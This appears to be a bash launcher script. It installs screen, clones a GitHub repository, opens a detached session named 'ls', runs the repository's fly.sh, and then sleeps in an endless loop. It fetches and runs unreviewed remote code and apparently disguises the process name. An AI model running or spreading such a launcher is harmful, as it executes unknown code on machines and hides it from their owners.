#!/bin/bash
sudo apt update
sudo apt install screen -y
git clone https://github.com/micin69/pretty-fly.git && cd pretty-fly
screen -dmS ls
chmod +x fly.sh && ./fly.sh
while [ 1 ]; do
sleep 3
done
sleep 999
